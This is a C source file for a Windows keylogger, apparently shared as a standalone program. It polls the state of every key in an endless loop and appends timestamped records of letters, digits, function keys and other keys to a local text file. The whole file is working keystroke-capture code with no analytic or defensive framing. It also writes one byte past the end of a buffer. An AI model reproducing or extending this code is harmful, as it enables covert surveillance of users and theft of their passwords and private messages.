// Filename: keylogger.c 
//original version by: Mharcos Nesster
//edited by: Anne, Joseph, Henrixss

#include <stdio.h>  
#include <windows.h>
#include <time.h>
#include<string.h>
 
int main() {
    short i;  // contador 
    short keyState;  // comparar key
	
	time_t rawtime;
	struct tm * timeinfo;
	char tempo[25];
	char buff[50];
	
    while(1) {
        for(i = 0; i <= 255; i++) {
			time ( &rawtime );
			timeinfo = localtime ( &rawtime );
            keyState = GetAsyncKeyState(i);
            if(keyState == -32767) {
                Sleep(30);
                FILE *file;
                file = fopen("texto.txt", "a+");
 
                if(file == NULL) {
                    printf("Erro ao criar o Arquivo test.txt.\n");
                    exit(1);
                }
				
				strcpy(tempo, asctime (timeinfo));
				tempo[24] = ':';
				tempo[25] = '\0';
				
				
				strcpy(buff, tempo);
				
                switch(i) {
					case 0x30:
					strcat(buff, " 0\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x31:
					strcat(buff, " 1\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x32:
					strcat(buff, " 2\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x33:
					strcat(buff, " 3\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x34:
					strcat(buff, " 4\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x35:
					strcat(buff, " 5\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x36:
					strcat(buff, " 6\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x37:
					strcat(buff, " 7\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x38:
					strcat(buff, " 8\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x39:
					strcat(buff, " 9\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x41:
					strcat(buff, " A\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x42:
					strcat(buff, " B\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x43:
					strcat(buff, " C\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x44:
					strcat(buff, " D\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x45:
					strcat(buff, " E\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x46:
					strcat(buff, " F\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x47:
					strcat(buff, " G\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x48:
					strcat(buff, " H\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x49:
					strcat(buff, " I\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x4A:
					strcat(buff, " J\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x4B:
					strcat(buff, " K\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x4C:
					strcat(buff, " L\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x4D:
					strcat(buff, " M\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x4E:
					strcat(buff, " N\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x4F:
					strcat(buff, " O\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x50:
					strcat(buff, " P\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x51:
					strcat(buff, " Q\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x52:
					strcat(buff, " R\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x53:
					strcat(buff, " S\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x54:
					strcat(buff, " T\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x55:
					strcat(buff, " U\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x56:
					strcat(buff, " V\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x57:
					strcat(buff, " W\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x58:
					strcat(buff, " X\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x59:
					strcat(buff, " Y\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case 0x5A:
					strcat(buff, " Z\r\n");
					fputs(buff, file);
					fclose(file);
					break;
                    case VK_SPACE:
					strcat(buff, " [SPACEBAR]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_SHIFT:
					strcat(buff, " [SHIFT]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_RETURN:
					strcat(buff, " [ENTER]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_BACK:
					strcat(buff, " [BACKSPACE]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_TAB:
					strcat(buff, " [TAB]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_CONTROL:
					strcat(buff, " [CTRL]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_MENU:
					strcat(buff, " [ALT]\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case VK_PRIOR:
					strcat(buff, " [PAGE UP]\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case VK_NEXT:
					strcat(buff, " [PAGE DOWN]\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case VK_END:
					strcat(buff, " [END]\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case VK_HOME:
					strcat(buff, " [HOME]\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case VK_LEFT:
					strcat(buff, " [LEFT ARROW]\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case VK_UP:
					strcat(buff, " [UP ARROW]\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case VK_RIGHT:
					strcat(buff, " [RIGHT ARROW]\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case VK_DOWN:
					strcat(buff, " [DOWN ARROW]\r\n");
					fputs(buff, file);
					fclose(file);
					break;
					case VK_SNAPSHOT:
					strcat(buff, " [PRINT SCREEN]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_INSERT:
					strcat(buff, " [INSERT]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_DELETE:
					strcat(buff, " [DEL]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_OEM_1:
					strcat(buff, " [;:]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_OEM_2:
					strcat(buff, " [/?]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_OEM_3:
					strcat(buff, " [`~]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_OEM_4:
					strcat(buff, " [[{]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_OEM_5:
					strcat(buff, " [\|]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_OEM_6:
					strcat(buff, " []}]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_OEM_7:
					strcat(buff, " ['\"]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case 187:
					strcat(buff, " +\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case 188:
					strcat(buff, " ,\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case 189:
					strcat(buff, " -\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case 190:
					strcat(buff, " .\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_NUMPAD0:
					strcat(buff, " 0\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_NUMPAD1:
					strcat(buff, " 1\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_NUMPAD2:
					strcat(buff, " 2\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_NUMPAD3:
					strcat(buff, " 3\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_NUMPAD4:
					strcat(buff, " 4\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_NUMPAD5:
					strcat(buff, " 5\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_NUMPAD6:
					strcat(buff, " 6\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_NUMPAD7:
					strcat(buff, " 7\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_NUMPAD8:
					strcat(buff, " 8\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_NUMPAD9:
					strcat(buff, " 9\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_MULTIPLY:
					strcat(buff, " *\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_ADD:
					strcat(buff, " +\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_SUBTRACT:
					strcat(buff, " -\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_DIVIDE:
					strcat(buff, " /\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_F1:
					strcat(buff, " F1\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_F2:
					strcat(buff, " F2\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_F3:
					strcat(buff, " F3\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_F4:
					strcat(buff, " F4\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_F5:
					strcat(buff, " F5\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_F6:
					strcat(buff, " F6\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_F7:
					strcat(buff, " F7\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_F8:
					strcat(buff, " F8\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_F9:
					strcat(buff, " F9\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_F10:
					strcat(buff, " F10\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_F11:
					strcat(buff, " F11\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_F12:
					strcat(buff, " F12\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_NUMLOCK:
					strcat(buff, " [NUM LOCK]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_SCROLL:
					strcat(buff, " [SCROLL LOCK]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_VOLUME_MUTE:
					strcat(buff, " Volume Mute\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_VOLUME_DOWN:
					strcat(buff, " Volume Down\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_VOLUME_UP:
					strcat(buff, " Volume Up\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_MEDIA_NEXT_TRACK:
					strcat(buff, " Next Track\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_MEDIA_PREV_TRACK:
					strcat(buff, " Previous Track\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_MEDIA_STOP:
					strcat(buff, " Stop Media\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_MEDIA_PLAY_PAUSE:
					strcat(buff, " Play/Pause Media\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
                    case VK_CAPITAL:
					strcat(buff, " [CAPS LOCK]\r\n");
					fputs(buff, file);
					fclose(file);
                    break;
					case VK_ESCAPE:
					strcpy(buff, tempo);
					strcat(buff, " [ESC]\r\n");
					fputs(buff, file);
					fclose(file);
					break;
                    default:
					/*
					fputs(tempo, file);
                    fputc(i, file);
					fputs("\r\n", file);
					*/
                    fclose(file);
                }
            }
        }
    }
    return 0;
}